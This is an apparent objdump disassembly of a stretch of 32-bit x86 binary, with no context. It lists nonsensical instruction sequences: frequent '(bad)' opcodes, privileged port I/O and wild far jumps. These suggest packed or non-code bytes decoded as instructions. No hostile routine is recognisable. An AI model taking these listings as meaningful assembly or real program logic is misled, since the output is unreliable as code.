  40e20d:	sub    BYTE PTR [esi],0x29
  40e210:	and    al,0xb7
  40e212:	shl    BYTE PTR [ebp+0x66],cl
  40e215:	stos   DWORD PTR es:[edi],eax
  40e216:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e217:	jae    0x40e1e0
  40e219:	sub    al,0xe8
  40e21b:	ror    DWORD PTR [ecx+0x73ff03ea],cl
  40e221:	rcr    BYTE PTR [edx],0xf0
  40e224:	cmp    ch,ah
  40e226:	add    ecx,DWORD PTR [ebp-0xaccc9e]
  40e22c:	pop    edx
  40e22d:	dec    edi
  40e22e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e22f:	je     0x40e1dc
  40e231:	cmp    BYTE PTR [eax],dh
  40e233:	or     BYTE PTR [edi-0x3701555d],bh
  40e239:	rol    al,cl
  40e23b:	(bad)  
  40e23d:	jbe    0x40e2b8
  40e23f:	jmp    0x40e265
  40e241:	lock xchg esi,eax
  40e243:	inc    BYTE PTR [eax]
	...
  40e259:	cmp    ah,BYTE PTR [ebx-0x17b16366]
  40e25f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e260:	imul   esi,DWORD PTR [edi-0x80fbfd2],0x7f082ff8
  40e26a:	cwde   
  40e26b:	dec    edx
  40e26c:	dec    DWORD PTR [eax-0x548b3d6c]
  40e272:	rol    al,cl
  40e274:	pop    es
  40e275:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e276:	test   DWORD PTR [edx],edx
  40e278:	push   0x436c7f
  40e27d:	sbb    al,BYTE PTR [edx]
  40e27f:	sub    al,0xb4
  40e281:	lock stos BYTE PTR es:[edi],al
  40e283:	aad    0x45
  40e285:	pop    eax
  40e286:	mov    eax,ds:0x6dbc3e1
  40e28b:	mov    al,ds:0xae02a0c2
  40e290:	aas    
  40e291:	push   ebx
  40e292:	add    ebp,ecx
  40e294:	add    esp,DWORD PTR [edi-0x1f67d471]
  40e29a:	mov    eax,ds:0xe740fc33
  40e29f:	inc    edx
  40e2a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e2a1:	and    DWORD PTR ds:0x85a130a9,ecx
  40e2a7:	adc    ebx,DWORD PTR [eax-0x2718e9f0]
  40e2ad:	dec    eax
  40e2ae:	retf   
  40e2af:	stos   BYTE PTR es:[edi],al
  40e2b0:	cld    
  40e2b1:	add    BYTE PTR [ecx-0x2e],dl
  40e2b4:	mov    edx,0x9c98070d
  40e2b9:	jne    0x40e2be
  40e2bb:	sub    cl,bh
	...
  40e2d1:	add    BYTE PTR [eax],ch
  40e2d3:	pop    ss
  40e2d4:	pop    esi
  40e2d5:	dec    esp
  40e2d6:	and    al,0x9a
  40e2d8:	out    0x2e,eax
  40e2da:	mov    ds:0xa603e85a,al
  40e2df:	add    ch,BYTE PTR [edx-0x55]
  40e2e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e2e3:	push   ss
  40e2e4:	out    dx,eax
  40e2e5:	fadd   DWORD PTR [eax]
  40e2e7:	retf   
  40e2e8:	sub    bh,ah
  40e2ea:	mov    eax,0x661e2c63
  40e2ef:	add    bl,BYTE PTR [edi+edi*1-0x45]
  40e2f3:	xor    DWORD PTR [esi],esp
  40e2f5:	das    
  40e2f6:	scas   eax,DWORD PTR es:[edi]
  40e2f7:	stos   BYTE PTR es:[edi],al
  40e2f8:	jmp    0x40e343
  40e2fa:	cwde   
  40e2fb:	mov    al,ds:0x16a7ac69
  40e300:	in     al,0x80
  40e302:	nop
  40e303:	add    eax,0x1e25fd7c
  40e308:	or     eax,0x8f204
  40e30d:	ret    0xcb64
  40e310:	shl    ecx,0xa4
  40e313:	lea    eax,[ebp+edx*8-0xc]
  40e317:	lahf   
  40e318:	je     0x40e30b
  40e31a:	cmp    al,0xad
  40e31c:	pop    eax
  40e31d:	(bad)  
  40e31e:	or     eax,DWORD PTR [ebp+0x578e8f7]
  40e324:	add    ecx,0xffffffa6
  40e327:	adc    eax,0xae816a06
  40e32c:	(bad)  
  40e32d:	cmp    esi,DWORD PTR [ecx]
  40e32f:	in     eax,dx
  40e330:	mov    edi,0x866a0
  40e335:	je     0x40e337
	...
  40e34b:	loope  0x40e2fb
  40e34d:	dec    edi
  40e34e:	sahf   
  40e34f:	leave  
  40e350:	or     ch,al
  40e352:	mov    al,ds:0xe2fe9f5d
  40e357:	in     al,0x16
  40e359:	push   es
  40e35a:	push   0xffffffc9
  40e35c:	scas   al,BYTE PTR es:[edi]
  40e35d:	push   ebx
  40e35f:	cli    
  40e360:	in     al,dx
  40e361:	mov    edi,0x7e6a0
  40e366:	pop    esp
  40e367:	test   eax,0x91664fae
  40e36c:	or     ch,al
  40e36e:	mov    WORD PTR [ebp-0x61],gs
  40e371:	(bad)  
  40e372:	push   0xfffffffc
  40e374:	fbstp  TBYTE PTR [edi+eiz*8+0x27]
  40e378:	pop    ds
  40e379:	in     al,dx
  40e37a:	jmp    0x296bec10
  40e37f:	std    
  40e380:	rol    DWORD PTR [edi],0xe9
  40e383:	cmp    DWORD PTR [esi-0x14],eax
  40e386:	cdq    
  40e387:	add    edx,DWORD PTR [edi]
  40e389:	or     BYTE PTR [ecx],dl
  40e38b:	xor    al,0x3a
  40e38d:	call   FWORD PTR [esi]
  40e38f:	daa    
  40e390:	xchg   edi,eax
  40e391:	pop    ds
  40e392:	pushf  
  40e393:	xchg   edx,eax
  40e394:	test   BYTE PTR [ebp+edi*8-0x5b],bh
  40e398:	adc    eax,0xc3550006
  40e39d:	mov    edx,0x458d0376
  40e3a3:	stos   BYTE PTR es:[edi],al
  40e3a4:	xor    edi,edi
  40e3a6:	jne    0x40e32e
  40e3a8:	jnp    0x40e41b
  40e3aa:	pop    ecx
  40e3ab:	dec    ecx
  40e3ac:	arpl   WORD PTR [ecx+0xf8],ax
	...
  40e3c2:	add    BYTE PTR [eax],al
  40e3c4:	scas   al,BYTE PTR es:[edi]
  40e3c5:	stc    
  40e3c6:	add    eax,0xfe52fb83
  40e3cb:	je     0x40e40d
  40e3cd:	mov    al,0xbe
  40e3cf:	leave  
  40e3d0:	or     al,0xe
  40e3d2:	add    BYTE PTR [ebp+0x6a4e5283],cl
  40e3d8:	sahf   
  40e3d9:	arpl   WORD PTR [ebx+0x8],si
  40e3dc:	data16 jecxz 0x40e437
  40e3df:	dec    DWORD PTR [ecx+0x71]
  40e3e2:	inc    ebx
  40e3e3:	in     al,dx
  40e3e4:	fisub  WORD PTR [ebx+0x73]
  40e3e7:	or     BYTE PTR [esi],ah
  40e3e9:	push   ebx
  40e3ea:	push   esi
  40e3eb:	call   FWORD PTR [ecx]
  40e3ed:	xchg   esi,esi
  40e3ef:	add    esp,edi
  40e3f1:	jae    0x63cf1ef
  40e3f7:	cmp    ebx,0x6e
  40e3fa:	(bad)  
  40e3fb:	je     0x40e3fd
  40e3fd:	mov    al,0xbe
  40e3ff:	leave  
  40e400:	mov    WORD PTR [esi],cs
  40e402:	add    BYTE PTR [ebx+0x40ec96],ah
  40e408:	dec    ebx
  40e409:	dec    ecx
  40e40a:	in     al,dx
  40e40b:	push   eax
  40e40c:	in     al,0xaa
  40e40e:	std    
  40e40f:	jne    0x40e3c7
  40e411:	push   0x48
  40e413:	pop    ecx
  40e414:	jns    0x40e479
  40e416:	lds    si,DWORD PTR [ecx]
  40e419:	inc    esi
  40e41a:	add    BYTE PTR [ebp+0x6a4e6f03],cl
  40e420:	(bad)  
  40e421:	popa   
  40e422:	jae    0x40e430
  40e424:	mov    ecx,0xe807fb
	...
  40e43d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e43e:	xchg   DWORD PTR [eax-0x3a1c7702],ebx
  40e444:	pop    es
  40e445:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e446:	jle    0x40e3d5
  40e448:	jmp    0x40e46e
  40e44a:	call   0x982b70ee
  40e44f:	xor    ch,al
  40e451:	(bad)  
  40e452:	jbe    0x40e3f5
  40e454:	(bad)  
  40e455:	pusha  
  40e456:	aas    
  40e457:	mov    al,ds:0xaaafd2fe
  40e45c:	dec    esi
  40e45d:	clc    
  40e45e:	mov    ah,0xa1
  40e460:	or     ah,BYTE PTR [edi+0x38]
  40e463:	adc    edi,edi
  40e465:	mov    edx,0x3b74a193
  40e46a:	mov    ah,0xdd
  40e46c:	std    
  40e46d:	xor    BYTE PTR [ebp+0xd],dl
  40e470:	shl    BYTE PTR [edx+0x2374a1ab],0x74
  40e477:	and    dl,BYTE PTR [ebp+0x18]
  40e47a:	jge    0x40e447
  40e47c:	shl    DWORD PTR [ebx-0x474c855],0x8c
  40e483:	pop    ss
  40e484:	or     al,0xf
  40e486:	pop    ecx
  40e487:	and    al,0xff
  40e489:	clc    
  40e48a:	nop
  40e48b:	ret    0xc473
  40e48e:	adc    al,0x18
  40e490:	adc    BYTE PTR [edi-0x7d],dl
  40e493:	int3   
  40e494:	pusha  
  40e495:	loopne 0x40e4bb
  40e497:	xor    ebp,DWORD PTR [eax+0x2f]
  40e49a:	bound  eax,QWORD PTR [edx+0x0]
  40e49d:	sar    BYTE PTR [esi+0xfefa],1
	...
  40e4b3:	add    BYTE PTR [eax],al
  40e4b5:	add    BYTE PTR [edx-0x69],dl
  40e4b8:	xor    bh,bh
  40e4ba:	cmp    dl,BYTE PTR [ebx-0x22d81a56]
  40e4c0:	mov    eax,ds:0xa176f2e7
  40e4c5:	(bad)  
  40e4c6:	fsubp  st(1),st
  40e4c8:	idiv   bh
  40e4ca:	sti    
  40e4cb:	add    dh,BYTE PTR [edx-0x51]
  40e4ce:	add    BYTE PTR [ebx],al
  40e4d0:	jmp    0x3d6b3787
  40e4d5:	inc    esi
  40e4d6:	out    0x2,al
  40e4d8:	push   cs
  40e4d9:	sbb    BYTE PTR [ebx-0xc5d1cd8],dh
  40e4df:	or     dl,BYTE PTR [ecx]
  40e4e1:	push   ebx
  40e4e2:	jno    0x40e481
  40e4e4:	cmc    
  40e4e5:	sub    ah,BYTE PTR [edi-0x379f01fe]
  40e4eb:	mov    edi,0x9da74329
  40e4f0:	push   ebx
  40e4f1:	adc    BYTE PTR [ebp-0x60e82a08],bh
  40e4f7:	stos   BYTE PTR es:[edi],al
  40e4f8:	outs   dx,DWORD PTR ds:[esi]
  40e4f9:	mov    eax,ds:0x4509d41
  40e4fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e4ff:	lods   eax,DWORD PTR ds:[esi]
  40e500:	jle    0x40e52e
  40e502:	pop    ebx
  40e503:	inc    ecx
  40e504:	sub    BYTE PTR [eax+ebp*1],al
  40e507:	pop    ss
  40e508:	(bad)  ds:0xc1b9dc3
  40e50e:	jo     0x2a5286b1
  40e514:	jmp    0x9cdd1c
  40e519:	mov    edi,0x0
	...
  40e52e:	add    BYTE PTR [ebp+0x43],ah
  40e531:	jmp    0x134f58d6
  40e536:	add    al,dh
  40e538:	push   ss
  40e539:	loope  0x40e4e6
  40e53b:	jge    0x40e4da
  40e53d:	ins    DWORD PTR es:[edi],dx
  40e53e:	mov    eax,ds:0xb0e90248
  40e543:	sbb    ch,BYTE PTR [edx]
  40e545:	xor    eax,0x56026645
  40e54a:	pop    ss
  40e54b:	fwait
  40e54c:	sub    BYTE PTR [edx],cl
  40e54e:	mov    eax,ds:0x38510a3b
  40e553:	mov    eax,0xa72c3d9c
  40e558:	add    al,BYTE PTR [eax]
  40e55a:	inc    esi
  40e55b:	inc    ebp
  40e55c:	and    eax,0x2e5aadd
  40e561:	call   FWORD PTR [eax+ebp*4-0x47e1dcd8]
  40e568:	or     ch,al
  40e56a:	aam    0x47
  40e56c:	popf   
  40e56d:	(bad)  
  40e56e:	and    BYTE PTR [ecx+0x4],ch
  40e571:	add    BYTE PTR [ebx+ebp*1+0x472582a8],bl
  40e578:	sub    al,BYTE PTR [eax]
  40e57a:	adc    DWORD PTR [edx-0x63],0x74
  40e57e:	loope  0x40e58c
  40e580:	dec    esi
  40e581:	pop    edx
  40e582:	out    0x7,al
  40e584:	mov    eax,DWORD PTR [ebp+ebx*8+0x7c]
  40e588:	adc    eax,0x9ba32844
  40e58d:	je     0x40e570
  40e58f:	or     al,0x4f
  40e591:	inc    esi
	...
  40e5a7:	add    BYTE PTR [edi],al
  40e5a9:	popf   
  40e5aa:	je     0x40e569
  40e5ac:	pop    es
  40e5ad:	pop    ss
  40e5ae:	or     cl,al
  40e5b0:	lea    edi,[eax]
  40e5b2:	jmp    FWORD PTR [esi-0x16fc3e13]
  40e5b8:	rol    DWORD PTR [edi-0x68179515],1
  40e5be:	imul   ebp,ecx,0x14fecfba
  40e5c4:	mov    bl,0xaa
  40e5c6:	sbb    al,0x23
  40e5c8:	inc    esi
  40e5c9:	popf   
  40e5ca:	mov    BYTE PTR [edi+eax*2],ah
  40e5cd:	and    al,0x84
  40e5cf:	sub    eax,0xf4ff0264
  40e5d4:	lods   al,BYTE PTR ds:[esi]
  40e5d5:	stos   BYTE PTR es:[edi],al
  40e5d6:	sbb    esp,DWORD PTR [esi+0x7]
  40e5d9:	popf   
  40e5da:	(bad)  
  40e5db:	aam    0x30
  40e5dd:	popf   
  40e5de:	je     0x40e5c1
  40e5e0:	cld    
  40e5e1:	inc    ebx
  40e5e2:	pop    edx
  40e5e3:	dec    esi
  40e5e4:	pop    es
  40e5e5:	retf   
  40e5e6:	rol    DWORD PTR [eax],0xca
  40e5e9:	call   DWORD PTR [ebx+ecx*4+0x62]
  40e5ed:	xchg   dl,al
  40e5ef:	clc    
  40e5f0:	in     al,0xff
  40e5f2:	imul   esi,DWORD PTR [ecx+edx*8],0xb2e807f4
  40e5f9:	fdivr  st,st(6)
  40e5fb:	call   DWORD PTR [edi]
  40e5fd:	inc    ebp
  40e5fe:	cld    
  40e5ff:	push   0x414400
  40e604:	mov    cl,0xf4
  40e606:	pop    es
  40e607:	call   0x3e47a1
	...
  40e620:	add    BYTE PTR [edi+edi*8],dl
  40e623:	scas   al,BYTE PTR es:[di]
  40e625:	cmp    al,BYTE PTR [eax+0x0]
  40e628:	push   0x4143f4
  40e62d:	inc    ecx
  40e62e:	mov    ecx,0x67f296e
  40e633:	call   0xfdbc77dd
  40e638:	or     ecx,DWORD PTR [esi]
  40e63a:	cli    
  40e63b:	mov    DWORD PTR ds:[ebx+0x2488667e],ecx
  40e642:	inc    esi
  40e643:	add    BYTE PTR [eax+0x3e],ch
  40e646:	(bad)  
  40e647:	out    dx,al
  40e648:	mov    esi,0x41415a66
  40e64d:	push   cs
  40e64e:	jl     0x40e6c3
  40e650:	clc    
  40e651:	xor    ecx,edi
  40e653:	pop    es
  40e654:	call   0x3fe1e7
  40e659:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e65a:	mov    ?,WORD PTR [eax-0x18f1c0]
  40e660:	jmp    DWORD PTR [ecx]
  40e662:	cmp    al,0x67
  40e664:	fnstsw WORD PTR [ebp-0x2400ffbb]
  40e66a:	jbe    0x40e669
  40e66c:	jne    0x40e644
  40e66e:	data16 je 0x40e6f0
  40e671:	jno    0x40e6ee
  40e673:	std    
  40e674:	jne    0x40e61d
  40e676:	xor    DWORD PTR [ecx+ecx*2-0x160b39d],ebp
  40e67d:	xor    al,BYTE PTR [ebp-0x61]
  40e680:	je     0x40e621
  40e682:	xor    DWORD PTR [ecx+0x58],esp
	...
  40e699:	add    BYTE PTR [eax-0x543e332d],ch
  40e69f:	stos   DWORD PTR es:[edi],eax
  40e6a0:	aaa    
  40e6a1:	mov    ecx,DWORD PTR [ebx-0x20437d3]
  40e6a7:	stos   DWORD PTR es:[edi],eax
  40e6a8:	sub    BYTE PTR ds:0xe80a7788,dh
  40e6ae:	push   es
  40e6af:	push   ebx
  40e6b0:	popf   
  40e6b1:	(bad)  
  40e6b2:	cs addr16 sahf 
  40e6b5:	addr16 sub eax,0x68004360
  40e6bb:	pop    ss
  40e6bc:	or     ebp,eax
  40e6be:	(bad)  
  40e6bf:	test   eax,0x3758fe9d
  40e6c4:	mov    al,ds:0xaa93dafe
  40e6c9:	mov    ebp,esi
  40e6cb:	mov    al,0x9d
  40e6cd:	enter  0xa065,0x2
  40e6d1:	push   ebp
  40e6d2:	sub    al,0xb0
  40e6d4:	add    ebx,0x6a043633
  40e6da:	jno    0x40e72c
  40e6dc:	pop    ss
  40e6dd:	or     BYTE PTR [edi],cl
  40e6df:	pushf  
  40e6e0:	cmp    edi,edi
  40e6e2:	sbb    BYTE PTR [ebx],dl
  40e6e4:	dec    eax
  40e6e5:	cld    
  40e6e6:	jg     0x40e754
  40e6e8:	inc    esi
  40e6e9:	inc    ecx
  40e6ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e6eb:	jo     0x40e704
  40e6ed:	or     BYTE PTR [edi],cl
  40e6ef:	pop    ecx
  40e6f0:	pushf  
  40e6f1:	(bad)  
  40e6f2:	clc    
  40e6f3:	adc    BYTE PTR [edi],0xfc
  40e6f6:	lock mov cs,WORD PTR [edx]
  40e6f9:	call   0xfedfd94a
	...
  40e712:	add    dh,ch
  40e714:	ins    DWORD PTR es:[edi],dx
  40e715:	push   es
  40e716:	add    BYTE PTR [edx+0x2],dh
  40e719:	jb     0x40e6ca
  40e71b:	and    eax,0xa7295cbf
  40e720:	sub    al,0x1e
  40e722:	lahf   
  40e723:	cmp    ecx,DWORD PTR [edx]
  40e725:	inc    ecx
  40e726:	sahf   
  40e727:	push   eax
  40e728:	cdq    
  40e729:	inc    ebp
  40e72a:	mov    WORD PTR [ebx-0x6a],gs
  40e72d:	rcl    al,1
  40e72f:	fs inc ebx
  40e731:	jmp    0x414c02d4
  40e736:	popf   
  40e737:	fwait
  40e738:	cdq    
  40e739:	and    eax,0x1d971b9e
  40e73e:	sbb    BYTE PTR [edi-0x7fc33d56],bl
  40e744:	cdq    
  40e745:	pop    ds
  40e746:	shl    DWORD PTR [edx+eax*1-0x7a837564],0x24
  40e74e:	lahf   
  40e74f:	inc    BYTE PTR [edx]
  40e751:	sbb    ebx,0x61
  40e754:	psraw  mm5,QWORD PTR [ebx-0x6219c596]
  40e75b:	pop    ds
  40e75c:	aas    
  40e75d:	(bad)  [edx+esi*2]
  40e760:	sub    BYTE PTR ds:[eax+eax*2],al
  40e764:	psraw  mm5,QWORD PTR [ebx-0x623a6895]
  40e76b:	xor    DWORD PTR [edi],ecx
  40e76d:	mov    ebp,0xc10ab39d
  40e772:	fwait
  40e773:	js     0x40e70e
  40e775:	lods   eax,DWORD PTR ds:[esi]
  40e776:	retf   
	...
  40e78b:	add    dh,ah
  40e78d:	std    
  40e78e:	call   0x9de703c9
  40e793:	pop    ss
  40e794:	fwait
  40e795:	stos   BYTE PTR es:[edi],al
  40e796:	push   ecx
  40e797:	cmp    eax,0xc3e19900
  40e79c:	je     0x40e795
  40e79e:	adc    BYTE PTR [esp+eiz*2-0xcc16bd],ch
  40e7a5:	xor    DWORD PTR [eax],eax
  40e7a7:	push   ss
  40e7a8:	inc    edx
  40e7a9:	cwde   
  40e7aa:	dec    edi
  40e7ab:	outs   dx,BYTE PTR ds:[esi]
  40e7ac:	mov    al,0xf2
  40e7ae:	dec    edi
  40e7af:	mov    ax,0xe80a
  40e7b3:	push   esi
  40e7b4:	adc    DWORD PTR [eax+0x3d6e41fe],ebx
  40e7ba:	dec    DWORD PTR [esi-0x14]
  40e7bd:	ret    0xe90b
  40e7c0:	jns    0x40e74f
  40e7c2:	jmp    0x40e82e
  40e7c4:	fist   WORD PTR [eax+0x2ca4c356]
  40e7ca:	cmp    DWORD PTR [esi],ebp
  40e7cc:	mov    al,0xa
  40e7ce:	call   0xfed8b468
  40e7d3:	jo     0x40e7b5
  40e7d5:	xchg   esi,eax
  40e7d6:	mov    dl,ah
  40e7d8:	sub    eax,0x24e940e0
  40e7dd:	fcos   
  40e7df:	jl     0x40e771
  40e7e1:	sub    bl,bh
  40e7e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e7e4:	in     eax,0x2
  40e7e6:	push   edi
  40e7e7:	add    edx,edi
  40e7e9:	out    0xff,al
  40e7eb:	call   0x46b4aa9f
	...
  40e804:	add    BYTE PTR [edx+0x2a45d9aa],bl
  40e80a:	cdq    
  40e80b:	or     ch,BYTE PTR [ecx+0x24892d98]
  40e811:	sbb    ebx,DWORD PTR [ecx-0x3813e8c]
  40e817:	(bad)  
  40e818:	xor    al,0x9b
  40e81a:	stos   BYTE PTR es:[edi],al
  40e81b:	test   DWORD PTR [esi+0x34fe9943],esi
  40e821:	cmp    ebp,DWORD PTR [edx]
  40e823:	sbb    al,0xa6
  40e825:	mov    ecx,0x2a20e80a
  40e82a:	cdq    
  40e82b:	(bad)  
  40e82c:	xchg   esi,eax
  40e82d:	cdq    
  40e82e:	call   0x8:0xf1bca69
  40e835:	push   ss
  40e836:	call   0xebaae839
  40e83b:	icebp  
  40e83c:	inc    esp
  40e83d:	(bad)  
  40e83e:	(bad)  
  40e83f:	(bad)  
  40e840:	jne    0x40e898
  40e842:	imul   esi,DWORD PTR [ebx+0x5e],0x49
  40e846:	jbe    0x40e851
  40e848:	shl    dl,0x91
  40e84b:	dec    esi
  40e84c:	jmp    ebx
  40e84e:	jnp    0x40e89e
  40e850:	call   ebx
  40e852:	or     ebp,eax
  40e854:	ins    BYTE PTR es:[edi],dx
  40e855:	nop
  40e856:	jbe    0x40e855
  40e858:	call   0x3fc1db
  40e85d:	f2xm1  
  40e85f:	imul   eax
  40e861:	push   ss
  40e862:	(bad)  
  40e864:	dec    edx
  40e866:	mov    dl,0xbe
  40e868:	mov    ecx,0x0
	...
  40e87d:	add    BYTE PTR [ecx-0x6300028a],ch
  40e883:	and    eax,0x7f130737
  40e888:	std    
  40e889:	jne    0x40e835
  40e88b:	jbe    0x40e900
  40e88d:	or     BYTE PTR [esi+0x59ff5698],dl
  40e893:	fcmovne st,st(0)
  40e895:	ret    0x342
  40e898:	push   ebp
  40e899:	mov    edi,DWORD PTR [edx+0x7b]
  40e89c:	jae    0x40e8aa
  40e89e:	jbe    0x40e8fc
  40e8a0:	pop    esp
  40e8a1:	call   FWORD PTR [ecx+0x7]
  40e8a4:	shl    BYTE PTR [ebx+ecx*2-0x15],0x0
  40e8a9:	inc    ebp
  40e8aa:	jg     0x40e8aa
  40e8ac:	dec    edi
  40e8ad:	call   0x3fc51f
  40e8b2:	mov    esi,0xbe10737b
  40e8b7:	jnp    0x40e92c
  40e8b9:	or     BYTE PTR [esi],dh
  40e8bb:	cwde   
  40e8bc:	aam    0xff
  40e8be:	sub    DWORD PTR [esi+0x6c],esp
  40e8c1:	pop    edx
  40e8c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e8c3:	jo     0x40e85f
  40e8c5:	enter  0xb4e5,0x2
  40e8c9:	push   ebp
  40e8ca:	sbb    al,0x6d
  40e8cc:	xchg   bl,al
  40e8ce:	out    dx,eax
  40e8cf:	out    dx,eax
  40e8d0:	sub    eax,0x99534d00
  40e8d5:	je     0x40e886
  40e8d7:	or     DWORD PTR [edx-0x72e02faa],0xd913cb44
  40e8e1:	mov    BYTE PTR [eax],al
	...
  40e8f7:	(bad)
  40e8fb:	js     0x40e8a6
  40e8fd:	push   cs
  40e8fe:	pop    ecx
  40e8ff:	aas    
  40e900:	cmp    eax,0x70a74140
  40e905:	stos   BYTE PTR es:[edi],al
  40e906:	(bad)  
  40e908:	stos   DWORD PTR es:[edi],eax
  40e909:	add    cl,BYTE PTR [ebx]
  40e90b:	addr16 push eax
  40e90d:	(bad)  
  40e90e:	push   esi
  40e90f:	jg     0x40e8f0
  40e911:	dec    DWORD PTR es:[eax-0x4a8c3d6f]
  40e918:	and    al,BYTE PTR [ecx-0x8]
  40e91b:	js     0x40e98c
  40e91d:	call   0x7f08:0x10fc8d69
  40e924:	push   ds
  40e925:	fwait
  40e926:	(bad)  
  40e927:	pusha  
  40e928:	lea    ecx,[edi]
  40e92a:	clc    
  40e92b:	int    0xc7
  40e92d:	cdq    
  40e92e:	je     0x40e8cf
  40e930:	mov    bl,0x1b
  40e932:	dec    DWORD PTR [eax-0x4b]
  40e935:	cdq    
  40e936:	je     0x40e977
  40e938:	inc    edx
  40e939:	out    0xfe,eax
  40e93b:	mov    dl,0xa3
  40e93d:	stos   BYTE PTR es:[edi],al
  40e93e:	imul   esi,DWORD PTR [eax],0xffffffbd
  40e941:	cdq    
  40e942:	(bad)  
  40e943:	mov    dl,0xc3
  40e945:	stos   BYTE PTR es:[edi],al
  40e946:	std    
  40e947:	jle    0x40e995
  40e949:	cdq    
  40e94a:	sti    
  40e94b:	aam    0x6b
  40e94d:	pop    ebx
  40e94e:	(bad)  
  40e94f:	adc    BYTE PTR [ebx],al
  40e951:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e952:	call   0x5d7a:0x2e06516
  40e959:	xchg   ebp,eax
  40e95a:	adc    BYTE PTR [eax],al
	...
  40e970:	sti    
  40e971:	xchg   ebp,eax
  40e972:	adc    ecx,DWORD PTR [edi+edi*8]
  40e975:	and    DWORD PTR [esi],ebx
  40e977:	fwait
  40e978:	jmp    0xa50699b2
  40e97d:	add    bl,BYTE PTR [edi+ecx*4]
  40e980:	int3   
  40e981:	and    DWORD PTR [edi+edx*4+0x2de92879],0xbd3958c
  40e98c:	iret   
  40e98d:	(bad)  
  40e98e:	mov    ebp,0xa38bb99a
  40e993:	xchg   edi,eax
  40e994:	sbb    eax,0x67eb6fd8
  40e999:	add    ch,BYTE PTR [ecx-0x26]
  40e99c:	mov    al,ds:0xab2ba911
  40e9a1:	aas    
  40e9a2:	test   al,0x3
  40e9a4:	clc    
  40e9a5:	stos   BYTE PTR es:[edi],al
  40e9a6:	mov    eax,0xf19588e7
  40e9ab:	ret    
  40e9ac:	hlt    
  40e9ad:	loope  0x40e96c
  40e9af:	stos   DWORD PTR es:[edi],eax
  40e9b0:	cmc    
  40e9b1:	and    DWORD PTR [esi],ecx
  40e9b3:	call   0x2ad8:0xfc7cc29d
  40e9ba:	jmp    0x809539c2
  40e9bf:	icebp  
  40e9c0:	jecxz  0x40ea05
  40e9c2:	jmp    0xf15039fa
  40e9c7:	stos   DWORD PTR es:[edi],eax
  40e9c8:	(bad)  
  40e9c9:	adc    al,0xde
  40e9cb:	cdq    
  40e9cc:	dec    eax
  40e9cd:	xchg   DWORD PTR [edi],ebp
  40e9cf:	cdq    
  40e9d0:	cmp    DWORD PTR [esi+0xc419],edx
	...
  40e9e6:	add    BYTE PTR [eax],al
  40e9e8:	add    bh,ch
  40e9ea:	xchg   esp,eax
  40e9eb:	lds    ebx,FWORD PTR [ecx-0x23716fd7]
  40e9f1:	test   eax,0x3ea9000f
  40e9f6:	push   cs
  40e9f7:	cld    
  40e9f8:	scas   al,BYTE PTR es:[edi]
  40e9f9:	mov    al,ds:0xd59be80a
  40e9fe:	xchg   ebp,eax
  40e9ff:	(bad)  
  40ea00:	ds in  al,dx
  40ea02:	ret    0xe903
  40ea05:	leave  
  40ea06:	mov    ebx,ebp
  40ea08:	push   0xffffffe7
  40ea0a:	pushf  
  40ea0b:	add    ah,0xde
  40ea0e:	out    0x40,al
  40ea10:	jmp    0xa044f9b9
  40ea15:	loope  0x40ea1f
  40ea17:	add    BYTE PTR [ebx],al
  40ea19:	stos   DWORD PTR es:[edi],eax
  40ea1a:	sub    BYTE PTR [eax],al
  40ea1c:	shr    DWORD PTR [edi],cl
  40ea1e:	xchg   esp,eax
  40ea1f:	je     0x40ea0e
  40ea21:	xchg   edx,eax
  40ea22:	add    ch,BYTE PTR [edx-0x17]
  40ea25:	or     al,0xdf
  40ea27:	sub    ch,cl
  40ea29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea2a:	mov    eax,DWORD PTR [ecx+eax*2+0xe]
  40ea2e:	push   cs
  40ea2f:	clc    
  40ea30:	push   ecx
  40ea31:	aad    0x39
  40ea33:	push   DWORD PTR [esi]
  40ea35:	sub    al,0x3f
  40ea37:	cld    
  40ea38:	mov    al,cs:0x309cfe9a
  40ea3e:	sub    bh,bh
  40ea40:	push   ds
  40ea41:	mov    al,0x6
  40ea43:	push   0xffffffe9
  40ea45:	retf   0xe802
  40ea48:	in     eax,0x83
  40ea4a:	xchg   esp,eax
  40ea4b:	(bad)  
  40ea4c:	je     0x40ea4e
	...
  40ea62:	test   al,0x8e
  40ea64:	dec    edi
  40ea65:	xchg   ebx,eax
  40ea66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea67:	sub    BYTE PTR [eax],al
  40ea69:	adc    DWORD PTR [edx+0x2a],0x0
  40ea6d:	out    dx,al
  40ea6e:	mov    eax,ds:0x5efcfe96
  40ea73:	out    0x40,al
  40ea75:	jmp    0x614f3e3b
  40ea7a:	sub    al,0x94
  40ea7c:	(bad)  
  40ea7d:	jmp    0x13519a5
  40ea82:	mov    ch,0x8d
  40ea84:	mov    eax,DWORD PTR [ebp+0x5e]
  40ea87:	shr    BYTE PTR [ecx+0x0],1
  40ea8a:	mov    WORD PTR fs:[eax+0x0],gs
  40ea8e:	data16 mov ch,0x43
  40ea91:	inc    ecx
  40ea92:	(bad)  
  40ea93:	jp     0x40eb08
  40ea95:	hlt    
  40ea96:	and    esi,ecx
  40ea98:	jne    0xff9fe2ec
  40ea9e:	fwait
  40ea9f:	outs   dx,BYTE PTR ds:[esi]
  40eaa0:	out    0xab,al
  40eaa2:	mov    ?,WORD PTR [ecx-0x3]
  40eaa5:	mov    DWORD PTR [ebx-0x253ff69a],ecx
  40eaab:	inc    edi
  40eaac:	push   DWORD PTR [ebp+0x26]
  40eaaf:	push   0x7a4158eb
  40eab4:	xchg   DWORD PTR [ebp+0x72],eax
  40eab7:	jp     0x40eb2c
